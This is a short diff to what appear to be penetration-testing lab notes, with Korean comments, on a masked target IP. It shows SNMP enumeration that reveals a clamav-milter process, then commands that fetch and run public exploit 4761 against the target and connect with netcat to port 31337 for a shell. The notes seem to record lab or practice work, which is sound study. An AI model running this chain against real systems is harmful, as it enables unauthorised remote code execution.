@@ -29,9 +29,15 @@ PORT      STATE SERVICE     VERSION
 
 # smtp get info
 snmp-check 192.168.xxx.xxx -c public
+[*] Processes:
+
+  Id                    Status                Name                  Path                  Parameters                       
+  3779                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
+
 
 # 실행중인 process 중 clamav-milter 에 취약점 있음
 searchsploit clamav-milter
+searchsploit -m 4761
 perl 4761.pl 192.168.xxx.xxx
 nc -nv 192.168.xxx.xxx 31337
 ```
